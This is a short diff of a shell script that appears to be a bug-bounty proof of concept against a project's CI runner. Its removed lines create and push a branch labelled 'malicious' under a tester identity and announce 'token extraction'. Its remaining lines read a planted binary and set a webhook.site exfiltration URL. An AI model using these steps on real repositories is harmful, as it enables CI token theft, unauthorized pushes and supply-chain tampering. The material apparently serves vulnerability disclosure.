@@ -42,16 +42,6 @@ cat /home/runner/.cargo/bin/bash >&2
 echo "-------------poc_hello--------------" >&2
 
 
-echo "--- creating malicious branch, can easily push to master or release ---" >&2 
-git config --global user.email "bh@someemail.com"
-git config --global user.name "H1Tester"
-git fetch origin >&2
-git checkout master >&2
-git pull origin master >&2
-git checkout -b bh-poc >&2
-git add . >&2
-git push -u origin bh-poc >&2
-echo "--- token extraction ---" >&2 
 
 export webhook="https://webhook.site/filecoin-project"
 
